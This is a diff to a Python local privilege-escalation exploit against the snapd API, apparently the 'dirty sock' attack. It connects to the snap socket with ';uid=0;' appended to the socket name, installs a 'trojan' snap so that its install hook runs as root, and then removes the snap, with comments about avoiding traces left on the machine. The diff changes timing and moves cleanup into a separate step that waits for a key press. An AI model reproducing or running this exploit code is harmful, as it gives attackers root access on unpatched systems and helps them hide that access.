@@ -179,7 +179,7 @@ Content-Type: application/octet-stream
                                   'Content-Length: ' + str(len(post_payload)) + '\r\n\r\n')
 
         # Send the headers to the snap API
-        print("[+] Installing the trojan snap (and sleeping 8 seconds)...")
+        print("[+] Installing the payload snap")
         self.sock.sendall(http_req1.encode("utf-8"))
 
         # Receive the initial HTTP/1.1 100 Continue reply
@@ -203,10 +203,9 @@ Content-Type: application/octet-stream
             print(http_reply)
             sys.exit()
 
-        # Sleep to allow time for the snap to install correctly. Otherwise,
-        # The uninstall that follows will fail, leaving unnecessary traces
-        # on the machine.
-        time.sleep(8)
+        # We sleep to allow the API command to complete, otherwise the install
+        # may fail.
+        time.sleep(5)
 
     def _remove_snap(self):
         post_payload = ('{"action": "remove",'
@@ -254,6 +253,8 @@ Content-Type: application/octet-stream
         self._connect_to_api()                  # Connect to the api using a dirty sock, importance here is ;uid=0; at the end of socket name
         self._remove_snap()                     # Remove the snap if it happens to be installed already
         self._install_snap()                    # Install the snap
+
+    def remove(self):
         self._remove_snap()                     # Remove the snap since we just needed the install hook to run and don't have any actual functionality in the snap
         self._cleanup()                         # Cleanup the temporary files
 
@@ -271,3 +272,7 @@ if __name__ == '__main__':
 
     # Execute
     sockpuppet.execute()
+
+    # Cleanup
+    input('[*] Press any key to cleanup the snap')
+    sockpuppet.remove()
